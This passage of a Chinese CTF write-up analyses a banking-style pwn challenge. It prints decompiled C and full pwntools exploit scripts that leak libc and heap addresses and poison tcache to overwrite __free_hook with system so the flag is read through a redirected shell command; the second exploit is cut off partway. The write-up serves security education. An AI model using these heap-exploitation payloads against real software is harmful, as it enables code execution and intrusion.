class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">cancellation</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">5</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( check_passwrod(user_id, &amp;password) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)user_list[user_id]);</span><br><span class="line">      user_id = <span class="number">-1</span>;</span><br><span class="line">      reply_message(<span class="number">1</span>, (__int64)<span class="string">&quot;The target account has been cancelled.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i != <span class="number">1</span> )</span><br><span class="line">      reply_message(<span class="number">2</span>, (__int64)<span class="string">&quot;password error.Try again.&quot;</span>);</span><br><span class="line">    get_message();</span><br><span class="line">  &#125;</span><br><span class="line">  reply_message(</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    (__int64)<span class="string">&quot;The password has been entered incorrectly for more than 5 times, and your account has been frozen.&quot;</span>);</span><br><span class="line">  *(_DWORD *)(user_list[user_id] + <span class="number">0x2C</span>LL) = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三处则是这里在free之后没有清空指针引起的UAF。</p><p>所以利用思路就是先泄漏libc地址，再泄漏heap地址，最后利用UAF篡改<code>tcache</code>中chunk的fd到<code>__free_hook</code>即可。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">3339</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random</span>(<span class="params">random</span>):</span></span><br><span class="line">    <span class="keyword">if</span> random &lt;= <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x30</span>+random</span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x61</span></span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">11</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x62</span></span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">12</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x63</span></span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">13</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x64</span></span><br><span class="line">    <span class="keyword">if</span> random == <span class="number">14</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x65</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">seed = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(seed))</span><br><span class="line">objdll = cdll.LoadLibrary(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">objdll.srand(seed)</span><br><span class="line">uuid = <span class="string">&#x27;yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy&#x27;</span></span><br><span class="line">uuid = <span class="built_in">list</span>(uuid)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1d</span> + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(uuid[i]) != <span class="number">52</span> <span class="keyword">and</span> <span class="built_in">ord</span>(uuid[i]) != <span class="number">45</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(uuid[i]) == <span class="number">0x78</span>:</span><br><span class="line">            random_num = objdll.rand() % <span class="number">15</span></span><br><span class="line">            uuid[i] = <span class="built_in">chr</span>(get_random(random_num))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            random_num = objdll.rand() % <span class="number">15</span></span><br><span class="line">            uuid[i] = <span class="built_in">chr</span>(get_random(random_num &amp; <span class="number">3</span> | <span class="number">8</span>))</span><br><span class="line">uuid = <span class="string">&#x27;&#x27;</span>.join(uuid)</span><br><span class="line"><span class="built_in">print</span>(uuid)</span><br><span class="line">r.send(uuid)</span><br><span class="line">r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>():</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;query&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_account</span>(<span class="params">account, password, money</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;new_account&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += password.ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += account.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += <span class="built_in">bytes</span>(<span class="built_in">str</span>(money), encoding=<span class="string">&#x27;utf8&#x27;</span>).ljust(<span class="number">0x4</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cancellation</span>(<span class="params">password</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;cancellation&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += password.ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">account, password</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;login&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += password.ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += account.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_pwd</span>(<span class="params">old_password, new_password</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;update_pwd&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += new_password.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input your pasword.&#x27;</span>)</span><br><span class="line">    r.recv(<span class="number">0x84</span> - <span class="built_in">len</span>(<span class="string">&#x27;please input your pasword.&#x27;</span>))</span><br><span class="line">    payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">    payload += old_password.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new_account(<span class="string">b&#x27;dzhsb&#x27;</span>, <span class="string">b&#x27;wow&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_account(<span class="string">b&#x27;dzz&#x27;</span>, <span class="string">b&#x27;zzz&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_account(<span class="string">b&#x27;a&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;stat_query&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">0x4</span>+<span class="number">0x18</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x21c87</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">r.recv(<span class="number">0x84</span> - <span class="number">0x24</span>)</span><br><span class="line"></span><br><span class="line">cancellation(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">login(<span class="string">b&#x27;dzz&#x27;</span>, <span class="string">b&#x27;zzz&#x27;</span>)</span><br><span class="line">cancellation(<span class="string">b&#x27;zzz&#x27;</span>)</span><br><span class="line">login(<span class="string">b&#x27;dzhsb&#x27;</span>, <span class="string">b&#x27;wow&#x27;</span>)</span><br><span class="line">query()</span><br><span class="line">r.recv(<span class="number">0x40</span> + <span class="number">4</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line">tcache_addr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(tcache_addr))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + <span class="number">0x3ed8e8</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line">login(flat(tcache_addr), flat(heap_addr))</span><br><span class="line">update_pwd(flat(heap_addr), flat(free_hook))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_account(<span class="string">b&#x27;&gt;&amp;4&#x27;</span>, <span class="string">b&#x27;cat flag&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line">new_account(<span class="string">b&#x27;196082&#x27;</span>, flat(system_addr), <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line">login(<span class="string">b&#x27;&gt;&amp;4&#x27;</span>, <span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">cancellation(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>因为这是cs架构的缘故，没有直接与程序进行交互，所以无法使用<code>system(&quot;/bin/sh&quot;);</code>。考虑使用反弹shell但是需要长度过长了，最后只能用这种重定向的方法传递flag。</p><h2 id="money"><a href="#money" class="headerlink" title="_money"></a>_money</h2><h3 id="利用分析-2"><a href="#利用分析-2" class="headerlink" title="利用分析"></a>利用分析</h3><p>这道题目的逆向部分和上面题目很类似，细心的话可以很快发现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">loan</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __m128i *v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 chunk; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( loan_idx &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    my_puts(<span class="string">&quot;The loan has reached the upper limit of the system.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( *(_DWORD *)(user_list[uid] + <span class="number">0x34</span>LL) )</span><br><span class="line">  &#123;</span><br><span class="line">    my_puts(<span class="string">&quot;You still have a loan that has not been paid off, so you cannot continue to borrow.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    my_puts(<span class="string">&quot;Please enter the loan amount (no more than 1 million).&quot;</span>);</span><br><span class="line">    money = input_l();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)money &gt; <span class="number">0xF4240</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      my_puts(<span class="string">&quot;Don&#x27;t push your luck.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      my_puts(<span class="string">&quot;Please leave your comments.&quot;</span>);</span><br><span class="line">      my_read((<span class="keyword">char</span> *)(loan_money + <span class="number">72LL</span> * loan_idx + <span class="number">0x20</span>), <span class="number">0x20</span>);</span><br><span class="line">      v0 = (__m128i *)(loan_money + <span class="number">72LL</span> * loan_idx);</span><br><span class="line">      chunk = user_list[uid];</span><br><span class="line">      *v0 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)(chunk + <span class="number">8</span>));</span><br><span class="line">      v0[<span class="number">1</span>] = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)(chunk + <span class="number">0x18</span>));</span><br><span class="line">      LODWORD(chunk) = loan_idx;</span><br><span class="line">      v2 = money;</span><br><span class="line">      *(_QWORD *)(loan_money + <span class="number">72LL</span> * loan_idx + <span class="number">0x40</span>) = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)money;</span><br><span class="line">      v3 = (_DWORD *)user_list[uid];</span><br><span class="line">      v3[<span class="number">10</span>] += v2;</span><br><span class="line">      v3[<span class="number">12</span>] += v2;</span><br><span class="line">      v3[<span class="number">14</span>] = chunk;</span><br><span class="line">      v3[<span class="number">13</span>] = <span class="number">1</span>;</span><br><span class="line">      loan_idx = chunk + <span class="number">1</span>;</span><br><span class="line">      my_puts(<span class="string">&quot;The application has been submitted. Please check it.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数中的因为对<code>loan_idx</code>检查不正确导致越界读写。利用思路就是通过越界写修改size，使原本chunk的size变为<code>0x460</code>，释放后进入<code>unsorted bin</code>通过越界读读取libc地址。再通过同样的办法使第一个chunk进入到tcache中去，泄漏出堆地址。最后有两个指针指向同一个地址，理所当然修改tcache中chunk的fd指针即可。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Query&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_account</span>(<span class="params">account, password, money</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;new_account&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the account id&#x27;</span>)</span><br><span class="line">    r.sendline(account)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the password&#x27;</span>)</span><br><span class="line">    r.sendline(password)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the money&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(money), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_account</span>(<span class="params">password</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Cancellation&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please enter the password&#x27;</span>)</span><br><span class="line">    r.sendline(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_info</span>(<span class="params">new_password, old_password</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Update_info&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please entet  a new password&#x27;</span>)</span><br><span class="line">    r.sendline(new_password)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input your password.&#x27;</span>)</span><br><span class="line">    r.sendline(old_password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loan_money</span>(<span class="params">amount, comments</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Loan_money&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Please enter the loan amount (no more than 1 million).&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(amount), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Please leave your comments.&#x27;</span>)</span><br><span class="line">    r.sendline(comments)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repayment</span>(<span class="params">amount</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Repayment&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;How much do you want to repay?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(amount), encoding=<span 